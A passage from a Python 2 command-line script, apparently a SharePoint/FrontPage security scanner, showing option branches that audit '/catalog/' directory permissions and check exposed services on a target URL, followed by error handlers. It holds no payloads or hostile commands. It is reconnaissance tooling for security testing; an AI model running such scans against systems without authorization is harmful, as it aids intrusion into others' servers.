                sharepoint_target_catalog)
            logger.info(
                "\n[+]-----------------------------------------------------------------")
            logger.info(
                "[+] auditing sharepoint '/catalog/' directory for access permissions")
            logger.info(
                "[+]------------------------------------------------------------------\n")
            audit(sharepoint_target_catalog)
            success("catalogs file access")
            return

        elif options.services == "serv" or options.services == "services":
            build_target(target, front_services, refine_target)
            logger.info(
                "\n[+]---------------------------------------------------------------")
            logger.info(
                "[+] checking exposed services in the frontpage/sharepoint  directory")
            logger.info(
                "[+]-----------------------------------------------------------------\n")
            audit(refine_target)
            success("exposed services check")

        else:
            logger.info("[-] please provide the proper scanning options")
            logger.info(
                "[+] check help (-h) for arguments and url specification")
            sys.exit(0)

    except ValueError as v:
        logger.error(
            "[-] ValueError occurred. Improper option argument or url")
        logger.error("[+] check for help (-h) for more details")
        sys.exit(0)

    except TypeError as t:
        logger.error("[-] TypeError occcured. Missing option argument or url")
        logger.error("[+] check for help (-h) for more details")
        sys.exit(0)

    except IndexError as e:
        usage()
        sys.exit(0)

    except urllib2.HTTPError as h:
        logger.error("[-] HTTPError : %s" % h.code)
        logger.error(
            "[+] please specify the target with protocol handlers as http | https")
        sys.exit(0)

    except urllib2.URLError as u:
        logger.error("[-] URLError : %s" % u.args)
        logger.error(
            "[+] please specify the target with protocol handlers as http | https")
        sys.exit(0)

    except KeyboardInterrupt:
        logger.error("[-] halt signal detected, exiting the program\n")
        sys.exit(0)

    except None:
        logger.info("[] Hey")
        sys.exit(0)

# calling main
if __name__ == '__main__':
    main()
